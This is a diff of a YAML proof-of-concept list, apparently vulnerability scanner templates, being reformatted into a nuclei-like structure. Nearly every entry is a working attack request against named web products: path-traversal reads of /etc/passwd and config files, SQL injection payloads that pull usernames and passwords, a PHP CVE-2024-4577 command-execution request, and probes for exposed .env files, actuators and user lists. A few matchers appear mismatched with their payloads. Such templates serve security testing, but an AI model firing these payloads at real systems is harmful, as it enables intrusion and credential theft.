@@ -1,604 +1,1050 @@
 pocs:
-  - metch: "get"
-    path: '/index/ajax/lang?lang=..//..//application/database'
-    body:
-      - "jsonpReturn"
-    matchers-condition: or
-    name: "Fastadmin file read"
-  - metch: "get"
-    path: '/common/download/resource?resource=/profile/../../../../../../../../../../etc/passwd'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name : "Ruoyi file read"
-  - metch: "get"
-    path: '/index.php/ApiAdminKefu/index?aid=3&uid=3'
-    body:
-      - "status"
-    matchers-condition: or
-    name: "Diandiancms sql vuln"
-  - metch: "get"
-    path: '/include/thumb.php?dir=http\..\..\config\config_db.php'
-    body:
-      - "<?php"
-    matchers-condition: or
-    name: "Metinfo file read"
-  - metch: "get"
-    path: "/INSTAL~1/eyoucms.sql"
-    body:
-      - "INSERT INTO"
-    name: "Eyoucms sql file read"
-    matchers-condition: or
-  - metch: "get"
-    path: '/api/products?sid=1%27'
-    body:
-      - "SQLSTATE"
-    matchers-condition: or
-    name: "Crmeb sql vuln"
-  - metch: "get"
-    path: '/api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,md5(1)))),0x7e),3550)'
-    body:
-      - "SQLSTATE"
-    matchers-condition: or
-    name: "Crmeb sql vuln"
-  - metch: "post"
-    path: '/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../etc/passwd'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "JQuery file read"
-  - metch: "get"
-    path: '/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "ASPcms sql vuln"
-  - metch: "get"
-    path: '/aspcms/admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&id=2=iif(((select asc(mid(LoginName,1,1)) from AspCms_User where UserID=1)=97),2,chr(97))'
-    body:
-      - "删除成功"
-      - "数据类型不匹配"
-    matchers-condition: or
-    name: "aspcms sql vuln"
-  - metch: "get"
-    path: "/?youc'"
-    body:
-      - "syntax"
-    matchers-condition: or
-    name: "PBootCms sql vuln"
-  - metch: "post"
-    path: '/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
-    body:
-      - "1337"
-    data: 'whoami;echo 1337; die;'
-    matchers-condition: or
-    name: "PHP CVE-2024-4577 vuln"
-  - metch: "get"
-    path: '/assets/file:%2f%2f/etc/passwd'
-    body:
-      - '/etc/passwd is no'
-      - 'root:x'
-    matchers-condition: or
-    name: "Ruby file read"
-  - metch: "get"
-    path: '/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34'
-    body:
-      - "读取文件成功"
-    matchers-condition: or
-    name: "Thinadmin file read"
-  - metch: "get"
-    path: '/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s'
-    body:
-      - "读取文件成功"
-    matchers-condition: or
-    name: "Thinadmin file read"
-  - metch: "post"
-    path: '/jeecg-boot/jmreport/qurestSql'
-    body:
-      - "XPATH"
-    json: {"apiSelectId":"1290104038414721025","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}
-    header:
-      Content-Type: "application/json"
-    matchers-condition: or
-    name: "Jeecg-Boot sql vuln"
-  - metch: "get"
-    path: '/common/download/resource?name=/profile/../../../../../../../etc/passwd'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "Ruoyi file read"
-  - metch: "get"
-    path: '/common/download/resource?resource=/profile/../../../../../../../windows/win.ini'
-    body:
-      - "for 16-bit app support"
-    matchers-condition: or
-    name: "Ruoyi file read"
-  - metch: "get"
-    path: '/common/download?fileName=../../../../etc/passwd&delete=false'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "Ruoyi file read"
-  - metch: "get"
-    path: '/common/download?delete=false&fileName=../../../../../etc/passwd'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "Ruoyi file read"
-  - metch: "get"
-    path: '/system/dept/list?dataScope=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))'
-    body:
-      - "SQLSTATE"
-    matchers-condition: or
-    name: "Ruoyi sql vuln"
-  - metch: "get"
-    path: '/system/role/list?dataScope=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))'
-    body:
-      - "SQLSTATE"
-    matchers-condition: or
-    name: "Ruoyi sql vuln"
-  - metch: "get"
-    path: '/system/user/list?dataScope=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))'
-    body:
-      - "SQLSTATE"
-    matchers-condition: or
-    name: "Ruoyi sql vuln"
-  - metch: "get"
-    path: '/system/dept/list?params%5BdataScope%5D=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))'
-    body:
-      - "SQLSTATE"
-    matchers-condition: or
-    name: "Ruoyi sql vuln"
-  - metch: "get"
-    path: '/system/role/list?params%5BdataScope%5D=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))'
-    body:
-      - "SQLSTATE"
-    matchers-condition: or
-    name: "Ruoyi sql vuln"
-  - metch: "get"
-    path: '/system/user/list?params%5BdataScope%5D=and+extractvalue(1,concat(0x7e,(select+user()),0x7e))'
-    body:
-      - "SQLSTATE"
-    matchers-condition: or
-    name: "Ruoyi sql vuln"
-  - metch: "get"
-    path: '/?id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1) #'
-    body:
-      - "XPATH"
-    matchers-condition: or
-    name: "Djanggo sql vuln"
-  - metch: "get"
-    path: '/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33'
-    body:
-      - "XPATH"
-    matchers-condition: or
-    name: "Doccms sql vuln"
-  - metch: "post"
-    path: '/delete_cart_goods.php'
-    data: 'id=0||(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))'
-    header:
-      Content-Type: "application/x-www-form-urlencoded"
-    matchers-condition: or
-    body:
-      - "XPATH"
-    name: "Ecshop sql vuln"
-  - metch: "get"
-    path: '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
-    body:
-      - "XPATH"
-    matchers-condition: or
-    name: "Exrick sql vuln"
-  - metch: "post"
-    path: '/index.php/api/Uploadify/preview'
-    data: 'data:image/php;base64,PD9waHAgcGhwaW5mbygpOw=='
-    body:
-      - "jsonrpc"
-    matchers-condition: or
-    name: "Eyoucms rce vuln"
-  - metch: "get"
-    path: '/mysql_config.ini'
-    body:
-      - "datauser"
-    matchers-condition: or
-    name: "Fanwei database info vuln"
-  - metch: "get"
-    path: '/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini'
-    body:
-      - "sdbuser"
-    matchers-condition: or
-    name: "Fanwei database info vuln"
-  - metch: "get"
-    path: '/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini'
-    body:
-      - "datauser"
-      - "datapassword"
-      - "dataname"
-    matchers-condition: and
-    name: "Fanwei file read vuln"
-  - metch: "get"
-    path: '/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../iweboffice/officeserver.php'
-    body:
-      - '<?php'
-    matchers-condition: or
-    name: "Fanwei file read vuln"
-  - metch: "get"
-    path: '/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/../../../login/login.jsp'
-    body:
-      - '<%@'
-      - '<?php'
-    matchers-condition: and
-    name: "Fanwei file read vuln"
-  - metch: "get"
-    path: '/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp'
-    body:
-      - '<%@'
-      - '<?php'
-    matchers-condition: and
-    name: "Fanwei file read vuln"
-  - metch: "get"
-    path: '/plt_document/fragments/content/pdfViewLocal.jsp?path=C:/Windows/Win.ini'
-    body:
-      - 'for 16-bit app support'
-    matchers-condition: or
-    name: "Jindieeas file read vuln"
-  - metch: "get"
-    path: '/api/v1/terminal/sessions/'
-    body:
-      - 'account_id'
-    matchers-condition: or
-    name: "Jumpserver info vuln"
-  - metch: "get"
-    path: '/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and extractvalue(1,concat(0x7e,md5(99999999))) -- a'
-    body:
-      - 'ef775988943825d2871e1cfa75473ec'
-    matchers-condition: or
-    name: "Knightcms info vuln"
-  - metch: "get"
-    path: '/storage/logs/laravel.log'
-    body:
-      - 'PDO->__construct'
-    matchers-condition: or
-    name: "Laravel CVE-2024-29291 vuln"
-  - metch: "get"
-    path: '/.env'
-    body:
-      - 'DB_HOST'
-      - 'REDIS_'
-    matchers-condition: or
-    name: "Laravel info vuln"
-  - metch: "get"
-    path: '/include/thumb.php?dir=http\..\..\config\config_db.php'
-    body:
-      - '<?php'
-    matchers-condition: or
-    name: "Metinfo info vuln"
-  - metch: "get"
-    path: '/rewrite?x=/../../../../etc/passwd'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "Nginx/OpenResty file read vuln"
-  - metch: "get"
-    path: '/msg/jpush/getUserTagNames/..;/..;/env'
-    body:
-      - 'jdbc:mysql://'
-    matchers-condition: or
-    name: "BC file read vuln"
-  - metch: "get"
-    path: '/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://dns/1.jpg[/img]'
-    body:
-      - 'parent.updateDownImageList'
-    matchers-condition: or
-    name: "Discuz ssrf vuln"
-  - metch: "get"
-    path: '/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema%20.tables%20group%20by%20x)a)%23'
-    body:
-      - 'MySQL Query Error'
-    matchers-condition: or
-    name: "Discuz sql vuln"
-  - metch: "get"
-    path: '/faq.php?action=grouppermission&gids[80]=%27&gids[81][0]=)%20and%20updatexml(1,concat(0x7e,(select%20@@version)),1)%23'
-    body:
-      - 'MySQL Query Error'
-    matchers-condition: or
-    name: "Discuz sql vuln"
-  - metch: "get"
-    path: '/config/config_global.php.bak'
-    body:
-      - 'CONFIG DB '
-      - 'CONFIG MEMORY'
-      - 'CONFIG SECURITY'
-      - '$_config'
-    matchers-condition: or
-    name: "web bak info vuln"
-  - metch: "get"
-    path: '/gpt/pictureproxy.php?url=/www/wwwroot/sxxp/web/bootstrap/cache/config.php'
-    body:
-      - 'file_get_contents'
-      - 'Failed to open stream'
-    matchers-condition: or
-    name: "Laravel / ThinkSNS fileread vuln"
-  - metch: "get"
-    path: '/index.php?a=display&templateFile=README.md'
-    body:
-      - '## README'
-    matchers-condition: or
-    name: "Laravel / ThinkSNS fileread vuln"
-  - metch: "get"
-    path: '/club/server/getClubAllUsers'
-    body:
-      - 'pwd'
-      - 'loginName'
-      - 'createdBy'
-    matchers-condition: and
-    name: "BC userinfo vuln"
-  - metch: "get"
-    path: '/api/system/operator/search'
-    body:
-      - 'userid'
-      - 'username'
-    matchers-condition: and
-    name: "BC userinfo vuln"
-  - metch: "get"
-    path: '/api/products?keyword=11&limit=8&news=0&page=1&priceOrder=&salesOrder=&sid=extractvalue(1,concat(char(126),md5(1700839030)))'
-    body:
-      - 'SQLSTATE'
-      - 'SQL syntax'
-      - 'XPATH syntax error'
-    matchers-condition: or
-    name: "Crmeb sql vuln"
-  - metch: "get"
-    path: '/?s=&*^(AS*&CGBSLJCLSAJKH3q7e8=-0'
-    body:
-      - '系统出现异常'
-      - '系统发生异常'
-      - '系统异常'
-      - '控制器不存在'
-      - '/www/wwwroot'
-    matchers-condition: or
-    name: "web error info vuln"
-  - metch: "get"
-    path: '/prod-api/actuator'
-    body:
-      - 'actuator/env'
-      - 'actuator/info'
-      - 'actuator/health'
-    matchers-condition: or
-    name: "Spring info vuln"
-  - metch: "get"
-    path: '/actuator'
-    body:
-      - 'actuator/env'
-      - 'actuator/info'
-      - 'actuator/health'
-    matchers-condition: or
-    name: "Spring info vuln"
-  - metch: "get"
-    path: '/..;/actuator'
-    body:
-      - 'actuator/env'
-      - 'actuator/info'
-      - 'actuator/health'
-    matchers-condition: or
-    name: "Spring info vuln"
-  - metch: "get"
-    path: '/prod-api/..;/actuator'
-    body:
-      - 'actuator/env'
-      - 'actuator/info'
-      - 'actuator/health'
-    matchers-condition: or
-    name: "Spring info vuln"
-  - metch: "get"
-    path: '/api/products?sid=1%27'
-    body:
-      - 'SQLSTATE'
-      - 'SQL syntax'
-      - 'XPATH syntax error'
-    matchers-condition: or
-    name: "Crmeb sql vuln"
-  - metch: "get"
-    path: '/etc/passwd?raw'
-    body:
-      - '/root:/bin/bash'
-    matchers-condition: or
-    name: "Vue3 file read vuln"
-  - metch: "get"
-    path: '/@fs/etc/passwd?import&raw??'
-    body:
-      - '/root:/bin/bash'
-    matchers-condition: or
-    name: "Vue3 file read vuln"
-  - metch: "get"
-    path: '/@fs/C://windows/win.ini?import&raw??'
-    body:
-      - 'for 16-bit app support'
-    matchers-condition: or
-    name: "Vue3 file read vuln"
-  - metch: "get"
-    path: '/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "Nexus file read vuln"
-  - metch: "get"
-    path: '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "Apache http server CVE-2021-41733 vuln"
-  - metch: "get"
-    path: '/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user'
-    body:
-      - 'select'
-      - 'clistbox'
-    matchers-condition: and
-    name: "Aspcms SQL vuln"
-  - metch: "get"
-    path: '/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "Bazaar v1.4.3 CVE-2024-40348 File Read Vuln"
-  - metch: "get"
-    path: '/api/v1/canal/config/1/0'
-    body:
-      - 'clusterId'
-      - 'serverId'
-    matchers-condition: and
-    name: "Alibaba Canal config Info Vuln"
-  - metch: "get"
-    path: '/de2api/engine/getEngine;.js'
-    body:
-      - 'catalogDesc'
-      - 'configuration'
-    matchers-condition: and
-    name: "DataEase CVE-2024-30269 Vuln"
-  - metch: "get"
-    path: '/api/v1/userlist?pageindex=0&pagesize=10'
-    body:
-      - 'Username'
-      - 'Password'
-      - 'RoleName'
-      - 'RoleId'
-    matchers-condition: and
-    name: "EasyCVR User Info Vuln"
-  - metch: "get"
-    path: '/public/plugins/gettingstarted/../../../../../../../../../../../../../../../etc/passwd'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "Grafana File Read Vuln"
-  - metch: "get"
-    path: '/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "JEEVMS File Read Vuln"
-  - metch: "get"
-    path: '/common/down/file?filekey=/../../../../../../../../../etc/passwd'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "JeePlus File Read Vuln"
-  - metch: "get"
-    path: '/a/sys/user/validateMobile?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%281%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271'
-    body:
-      - 'SQLSTATE'
-      - 'SQL syntax'
-      - 'XPATH syntax error'
-    matchers-condition: or
-    name: "JeePlus SQL Vuln"
-  - metch: "get"
-    path: '/a/sys/user/resetPassword?mobile=13588888888''and (updatexml(1,concat(0x7e,(select user()),0x7e),1))%23'
-    body:
-      - 'SQLSTATE'
-      - 'SQL syntax'
-      - 'XPATH syntax error'
-    matchers-condition: or
-    name: "JeePlus SQL Vuln"
-  - metch: "post"
-    path: '/mobile/Remote/GetParkController'
-    body:
-      - 'SQLSTATE'
-      - 'SQL syntax'
-      - 'XPATH syntax error'
-    data: 'deviceId=1''and/**/extractvalue(1,concat(char(126),database()))and'''
-    matchers-condition: or
-    name: "JieLink+ SQL Vuln"
-  - metch: "get"
-    path: '/api/index.php/v1/config/application?public=true'
-    body:
-      - 'attributes'
-      - 'application'
-    matchers-condition: and
-    name: "Joomla CVE-2023-23752 Vuln"
-  - metch: "get"
-    path: '/api/v1/terminal/sessions/'
-    body:
-      - 'user_id'
-      - 'org_id'
-      - 'account_id'
-    matchers-condition: and
-    name: "JumpServer CVE-2023-42442 Vuln"
-  - metch: "get"
-    path: '/gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2'
-    body:
-      - 'root:x'
-    matchers-condition: or
-    name: "KEDACOM File Read Vuln"
-  - metch: "get"
-    path: '/nacos/v1/auth/users?pageNo=1&pageSize=10'
-    body:
-      - 'username'
-      - 'password'
-      - 'totalCount'
-    matchers-condition: or
-    name: "Nacos CVE-2021-29441 Vuln"
-  - metch: "get"
-    path: '/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId='
-    body:
-      - 'DEFAULT_GROUP'
-    matchers-condition: or
-    name: "Nacos File Dump Vuln"
-  - metch: "get"
-    path: '/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=12'
-    body:
-      - 'SQLSTATE'
-      - 'SQL syntax'
-      - 'XPATH syntax error'
-    matchers-condition: or
-    name: "PbootCMS SQL Vuln"
-  - metch: "get"
-    path: '/index.php/Search/index?keyword=aaaa&updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123'
-    body:
-      - 'SQLSTATE'
-      - 'SQL syntax'
-      - 'XPATH syntax error'
-    matchers-condition: or
-    name: "PbootCMS SQL Vuln"
-  - metch: "get"
-    path: '/?tag=%7d%73%71%6c%3a%20%20%7b%70%62%6f%6f%74%3a%6c%69%73%74%20%66%69%6c%74%65%72%3d%31%3d%32%29%55%4e%49%4f%4e%28%53%45%4c%45%43%54%2f%2a%2a%2f%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%28%73%65%6c%65%63%74%2f%2a%2a%2f%76%65%72%73%69%6f%6e%28%29%29%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%2c%31%29%2f%2a%2a%2f%23%2f%2a%2a%2f%7c%31%32%33%20%73%63%6f%64%65%3d%31%32%33%7d%5b%6c%69%73%74%3a%6c%69%6e%6b%20%6c%69%6e%6b%3d%61%73%64%5d%7b%2f%70%62%6f%6f%74%3a%6c%69%73%74%7d'
-    body:
-      - 'SQLSTATE'
-      - 'SQL syntax'
-      - 'XPATH syntax error'
-    matchers-condition: or
-    name: "PbootCMS SQL Vuln"
-  - metch: "get"
-    path: '/sys/dict/loadTreeData?tableName=sys_user&text=password%20text,id&code=password&hasChildField=&converIsLeafVal=1&condition=&pid=admin&pidField=username'
-    body:
-      - 'key'
-      - 'parentId'
-      - 'children'
-    matchers-condition: and
-    name: "PbootCMS SQL Vuln"
-  - metch: "get"
-    path: '/system/dictData/getDictItems/gen_table,user(),1,1'
-    body:
-      - 'dataLabel'
-      - 'dataId'
-    matchers-condition: and
-    name: "Pear Admin Boot SQL Vuln"
-  - metch: "post"
-    path: '/pay/index/pay_callback.html'
-    body:
-      - 'PHP Version'
-      - 'Loaded plugins'
-    data: 'out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo'
-    matchers-condition: or
-    name: "YzmCMS pay_callback Rce Vuln"
-  - metch: "post"
-    path: '/adminapi/setting/config/save_basics'
-    body:
-      - 'for 16-bit app support'
-    json: { 'weixin_ckeck_file': '../../../../../../../../Windows/win.ini' }
-    matchers-condition: or
-    name: "Crmeb read file vuln"
-  - metch: "post"
-    path: '/adminapi/setting/config/save_basics'
-    body:
-      - 'root:x'
-    json: { 'weixin_ckeck_file': '../../../../../../../../etc/passwd' }
-    matchers-condition: or
-    name: "Crmeb read file vuln"
+  - id: "fastadmin-file-read"
+    name: "Fastadmin File Read Vulnerability"
+    requests:
+      - method: "GET"
+        path: '/index/ajax/lang?lang=..//..//application/database'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "jsonpReturn"
+            condition: "or"
+
+  - id: "ruoyi-file-read-1"
+    name: "Ruoyi File Read Vulnerability"
+    requests:
+      - method: "GET"
+        path: '/common/download/resource?resource=/profile/../../../../../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x'
+            condition: "or"
+
+  - id: "diandiancms-sql-vuln"
+    name: "Diandiancms SQL Injection Vulnerability"
+    requests:
+      - method: "GET"
+        path: "/index.php/ApiAdminKefu/index?aid=3&uid=3"
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "status"
+            condition: "or"
+
+  - id: "metinfo-file-read"
+    name: "Metinfo File Read Vulnerability"
+    requests:
+      - method: "GET"
+        path: '/include/thumb.php?dir=http\..\..\config\config_db.php'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - '<?php'
+            condition: "or"
+
+  - id: "eyoucms-sql-file-read"
+    name: "Eyoucms SQL File Read Vulnerability"
+    requests:
+      - method: "GET"
+        path: '/INSTAL~1/eyoucms.sql'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'INSERT INTO'
+            condition: "or"
+
+  - id: "crmeb-sql-vuln-1"
+    name: "Crmeb SQL Injection Vulnerability"
+    requests:
+      - method: "GET"
+        path: '/api/products?sid=1%27'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "SQLSTATE"
+            condition: "or"
+
+  - id: "crmeb-sql-vuln-2"
+    name: "Crmeb SQL Injection Vulnerability"
+    requests:
+      - method: "GET"
+        path: '/api/products?limit=20&priceOrder=&salesOrder=&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,md5(1))),0x7e),3550)'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "SQLSTATE"
+            condition: "or"
+
+  - id: "jquery-file-read"
+    name: "JQuery File Read Vulnerability"
+    requests:
+      - method: "POST"
+        path: '/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x'
+            condition: "or"
+
+  - id: "aspcms-sql-vuln-1"
+    name: "ASPcms SQL Injection Vulnerability"
+    requests:
+      - method: "GET"
+        path: '/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x'
+            condition: "or"
+
+  - id: "aspcms-sql-vuln-2"
+    name: "ASPcms SQL Injection Vulnerability"
+    requests:
+      - method: "GET"
+        path: '/aspcms/admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&id=2=iif(((select asc(mid(LoginName,1,1)) from AspCms_User where UserID=1)=97),2,chr(97))'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "删除成功"
+              - "数据类型不匹配"
+            condition: "or"
+
+  - id: "pbootcms-sql-vuln"
+    name: "PBootCms SQL Injection Vulnerability"
+    requests:
+      - method: "GET"
+        path: "/?youc'"
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "syntax"
+            condition: "or"
+
+  - id: "php-cve-2024-4577-vuln"
+    name: "PHP CVE-2024-4577 Vulnerability"
+    requests:
+      - method: "POST"
+        path: '/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
+        body: 'whoami;echo 1337; die;'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "1337"
+            condition: "or"
+
+  - id: "ruby-file-read"
+    name: "Ruby File Read Vulnerability"
+    requests:
+      - method: "GET"
+        path: '/assets/file:%2f%2f/etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - '/etc/passwd is no'
+              - 'root:x'
+            condition: "or"
+
+  - id: "thinadmin-file-read-1"
+    name: "Thinadmin File Read Vulnerability"
+    requests:
+      - method: "GET"
+        path: '/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "读取文件成功"
+            condition: "or"
+
+  - id: "thinadmin-file-read-2"
+    name: "Thinadmin File Read Vulnerability"
+    requests:
+      - method: "GET"
+        path: '/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "读取文件成功"
+            condition: "or"
+
+  - id: "jeecg-boot-sql-vuln"
+    name: "Jeecg-Boot SQL Injection Vulnerability"
+    requests:
+      - method: "POST"
+        path: "/jeecg-boot/jmreport/qurestSql"
+        headers:
+          Content-Type: "application/json"
+        body: '{"apiSelectId":"1290104038414721025","id":"1'' or ''%1%'' like (updatexml(0x3a,concat(1,(select current_user)),1)) or ''%%'' like ''"}'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "XPATH"
+            condition: "or"
+  - id: "ruoyi-file-read-2"
+    name: "Ruoyi 文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/common/download/resource?name=/profile/../../../../../../../etc/passwd'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x'
+            condition: "or"
+
+  - id: "ruoyi-windows-file-read"
+    name: "Ruoyi Windows文件读取漏洞"
+    requests:
+      - method: "GET"
+        path: '/common/download/resource?resource=/profile/../../../../../../../windows/win.ini'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'for 16-bit app support'
+            condition: "or"
+
+  - id: "ruoyi-file-read-3"
+    name: "Ruoyi 文件读取漏洞变种"
+    requests:
+      - method: "GET"
+        path: '/common/download?fileName=../../../../etc/passwd&delete=false'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - 'root:x'
+            condition: "or"
+  - id: "djanggo-sql-vuln"
+    name: "Djanggo框架SQL注入漏洞"
+    requests:
+      - method: "GET"
+        path: '/?id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1) #'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "XPATH"
+            condition: "or"
+
+  - id: "doccms-sql-vuln"
+    name: "Doccms SQL注入漏洞"
+    requests:
+      - method: "GET"
+        path: '/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "XPATH"
+            condition: "or"
+
+  - id: "ecshop-sql-vuln"
+    name: "Ecshop SQL注入漏洞"
+    requests:
+      - method: "POST"
+        path: "/delete_cart_goods.php"
+        headers:
+          Content-Type: "application/x-www-form-urlencoded"
+        body: 'id=0||(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "XPATH"
+            condition: "or"
+
+  - id: "exrick-sql-vuln"
+    name: "Exrick SQL注入漏洞"
+    requests:
+      - method: "GET"
+        path: '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
+        matchers:
+          - type: "word"
+            part: "body"
+            words:
+              - "XPATH"
+            condition: "or"
+
+  - id: "eyoucms-rce-vuln"
